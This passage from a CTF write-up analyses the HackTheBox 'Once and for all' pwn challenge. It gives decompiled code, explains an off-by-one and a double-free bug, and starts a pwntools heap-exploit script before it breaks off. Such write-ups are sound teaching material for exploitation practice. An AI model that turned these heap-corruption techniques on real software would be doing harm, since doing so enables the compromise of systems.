<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="true" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  

  
  <title>[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all | repr</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
  <link rel="preload" href="/css/fonts/MaterialSymbolsRounded.woff2" as="font" type="font/woff2" crossorigin="anonymous">

  <meta name="description" content="Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.Find the tasks and the final exploit here and here. Reve">
<meta property="og:type" content="article">
<meta property="og:title" content="[HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all">
<meta property="og:url" content="https://n4sm.github.io/posts/onceandforall/index.html">
<meta property="og:site_name" content="repr">
<meta property="og:description" content="Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.Find the tasks and the final exploit here and here. Reve">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-05-18T22:00:00.000Z">
<meta property="article:modified_time" content="2023-09-05T09:45:11.052Z">
<meta property="article:author" content="nasm">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="repr" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/pic/wall.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>repr </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=https://cdn.discordapp.com/attachments/755522926819934349/1135933820852502589/chtholly_nota_seniorious_by_asukaln_dfhx63b-414w-2x.jpg></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">nasm </div>
      <div class="dot"></div>
      <div class="subtitle">pwn / kernel stuff </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/nasm_re" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/n4sm" title="GitHub"><i class="fa-brands fa-github"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://ret2school.github.io/discord" title="Discord"><i class="fa-brands fa-discord"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/pwn/">
                pwn
                <div class="category-count">19</div>
            </a>
        
            <a class="category-link" href="/categories/kernel/">
                kernel
                <div class="category-count">3</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/posts/iwindow/" title="[ImaginaryCTF 2023 - pwn] window-of-opportunity" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] window-of-opportunity
            </div>
          </a>
        
          <a class="recent-link" href="/posts/mailman/" title="[ImaginaryCTF 2023 - pwn] mailman" >
            <div class="recent-link-text">
              [ImaginaryCTF 2023 - pwn] mailman
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-onceandforall" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        [HackTheBox Cyber Apocalypse 2022 - pwn] Once and for all
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2022-05-18T22:00:00.000Z" itemprop="datePublished">2022-05-19</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/pwn/">pwn</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            3.3k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>Once for all is a heap challenge I did during the HackTheBox Cyber Apocalypse event. This is a classic unsorted bin attack plus a FSOP on stdin.<br>Find the tasks and the final exploit <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/">here</a> and <a target="_blank" rel="noopener" href="https://github.com/ret2school/ctf/blob/master/2022/apocalypse/onceAndmore/exploit.py">here</a>.</p>
<h1 id="Reverse-engineering"><a href="#Reverse-engineering" class="headerlink" title="Reverse engineering"></a>Reverse engineering</h1><p>All the snippets of pseudo-code are issued by <a target="_blank" rel="noopener" href="https://hex-rays.com/ida-free/">IDA freeware</a>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-8h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">49</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(&amp;unk_1310);</span><br><span class="line">    __isoc99_scanf(&amp;unk_13C8, &amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(s);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        small_alloc(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        fix(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        examine(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        savebig(s);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid choice!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The binary allows you to allocate a small chunk beetween <code>0x1f</code> and <code>0x38</code> bytes:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">small_alloc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> nmemb; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 idx[<span class="number">3</span>]; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( allocated == <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Nothing more!&quot;</span>);</span><br><span class="line">  ++allocated;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose an index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, idx);</span><br><span class="line">  <span class="keyword">if</span> ( size_array[<span class="number">2</span> * idx[<span class="number">0</span>]] || (&amp;alloc_array)[<span class="number">2</span> * idx[<span class="number">0</span>]] || idx[<span class="number">0</span>] &gt; <span class="number">0xE</span>uLL )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nHow much space do you need for it: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;nmemb);</span><br><span class="line">  <span class="keyword">if</span> ( nmemb &lt;= <span class="number">0x1F</span> || nmemb &gt; <span class="number">0x38</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[-] Your inventory cannot provide this type of space!&quot;</span>);</span><br><span class="line">  size_array[<span class="number">2</span> * idx[<span class="number">0</span>]] = nmemb;</span><br><span class="line">  v1 = idx[<span class="number">0</span>];</span><br><span class="line">  (&amp;alloc_array)[<span class="number">2</span> * v1] = (<span class="type">void</span> **)<span class="built_in">calloc</span>(nmemb, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !(&amp;alloc_array)[<span class="number">2</span> * idx[<span class="number">0</span>]] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[-] Something didn&#x27;t work out...&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your weapon&#x27;s details: &quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="meta"># off-by-one</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (&amp;alloc_array)[<span class="number">2</span> * idx[<span class="number">0</span>]], nmemb + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>As you can see right above this function contains an off-by-one vulnerability, which means we can write only one byte right after the allocated chunk, overlapping the size field of the next chunk &#x2F; top chunk.</p>
<p>The fix function frees a chunk and asks for another size, then it allocates another chunk with <code>calloc</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fix</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 idx; <span class="comment">// [rsp+8h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  __int64 v4[<span class="number">3</span>]; <span class="comment">// [rsp+18h] [rbp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose an index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;idx);</span><br><span class="line">  <span class="keyword">if</span> ( !size_array[<span class="number">2</span> * idx] || !alloc_array[<span class="number">2</span> * idx] || idx &gt; <span class="number">0xE</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok, let&#x27;s get you some new parts for this one... seems like it&#x27;s broken&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(alloc_array[<span class="number">2</span> * idx]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nHow much space do you need for this repair: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( size &lt;= <span class="number">0x1F</span> || size &gt; <span class="number">0x38</span> )</span><br><span class="line">    # [<span class="number">1</span>] </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[-] Your inventory cannot provide this type of space.&quot;</span>);</span><br><span class="line">  size_array[<span class="number">2</span> * idx] = size;</span><br><span class="line">  v1 = idx;</span><br><span class="line">  alloc_array[<span class="number">2</span> * v1] = <span class="built_in">calloc</span>(size, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !alloc_array[<span class="number">2</span> * idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Something didn&#x27;t work out...&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input your weapon&#x27;s details: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, alloc_array[<span class="number">2</span> * idx], size);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What would you like to do now?\n1. Verify weapon\n2. Continue\n&gt;&gt; &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, v4);</span><br><span class="line">  result = v4[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v4[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( verified )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;unk_1648);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)alloc_array[<span class="number">2</span> * idx]);</span><br><span class="line">      verified = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>If we reach <code>[1]</code>, <code>alloc_array[2 * idx]</code> is freed leading to a double free.</p>
<p>We can print a chunk only one time:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">examine</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( examined )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(&amp;unk_14D0);</span><br><span class="line">  examined = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Choose an index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( size_array[<span class="number">2</span> * v1] &amp;&amp; alloc_array[<span class="number">2</span> * v1] &amp;&amp; v1 &lt;= <span class="number">0xE</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>((<span class="type">const</span> <span class="type">char</span> *)alloc_array[<span class="number">2</span> * v1]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Finally we can malloc a huge chunk, but we cannot wriet anything within:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">savebig</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( chungus_weapon || qword_202068 )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(&amp;unk_16E8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;How much space do you need for this massive weapon: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int16)size &gt; <span class="number">0x5AF</span>u &amp;&amp; (<span class="type">unsigned</span> __int16)size &lt;= <span class="number">0xF5C0</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Adding to your inventory..&quot;</span>);</span><br><span class="line">      chungus_weapon = size;</span><br><span class="line">      v0 = <span class="built_in">malloc</span>(size);</span><br><span class="line">      qword_202068 = (__int64)v0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;[-] This is not possible..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h2 id="What-we-have"><a href="#What-we-have" class="headerlink" title="What we have"></a>What we have</h2><ul>
<li>An off-by-one when we create a new chunk</li>
<li>Double free by calling <code>fix</code> and then providing an invalid size.</li>
<li>Trivial read after free thanks to the double free.</li>
</ul>
<h2 id="Restrictions"><a href="#Restrictions" class="headerlink" title="Restrictions"></a>Restrictions</h2><ul>
<li>The program does not use <code>printf</code> with a format specifer, then we cannot do a <a target="_blank" rel="noopener" href="https://maxwelldulin.com/BlogPost?post=3107454976">House of husk</a>.</li>
<li>We can only allocate <code>15</code> chunks.</li>
<li>All the allocations except the big one are made using <code>calloc</code>, even if it can be easily bypassed by adding the <code>IS_MAPPED</code> flag to the chunk header to avoid zero-ing.</li>
<li>The libc version (<code>2.27</code>) mitigates a few techniques, especially the <a target="_blank" rel="noopener" href="https://1ce0ear.github.io/2017/11/26/study-house-of-orange/">House of Orange</a> and introduces the <code>tcache</code>.</li>
<li>Allocations have to fit in only two fastbins (<code>0x30</code> &#x2F; <code>0x40</code>), which means we cannot get an arbitrary with a <code>fastbin dup</code> technique due to the size of most of interesting memory areas in the libc (<code>0x7f</code> &#x3D;&gt; <code>0x70</code> fastbin against <code>0x30</code> &#x2F; <code>0x40</code> in our case).</li>
</ul>
<h2 id="How-to-leak-libc"><a href="#How-to-leak-libc" class="headerlink" title="How to leak libc ?"></a>How to leak libc ?</h2><p>Partial overwrites are as far as I know very hard to get because of <code>calloc</code>. The first thing to do is to leak libc addresses to then target libc global variables &#x2F; structures. The classic way to get a libc leak is to free a chunk that belongs to the unsorted bin and then print it. But as seen previously, we cannot allocate a large chunks that would end up in the unsorted bin. To do so we have to use the off-by-one bug to overwrite the next chunk’s size field with a bigger one that would correspond to the unsorted bin (<code>&gt;= 0x90</code>). We can edit the size of the second chunk from <code>0x30</code> to <code>0xb0</code> by doing:</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, data, hang=<span class="literal">False</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choose an index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;How much space do you need for it: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    <span class="keyword">if</span> hang == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Input your weapon&#x27;s details: \n&quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">freexalloc</span>(<span class="params">idx, size, data, doubleFree=<span class="literal">False</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choose an index: &quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;How much space do you need for this repair: &quot;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> doubleFree:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Input your weapon&#x27;s details: \n&quot;</span>, data)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;Choose an index: &quot;</span>, <span 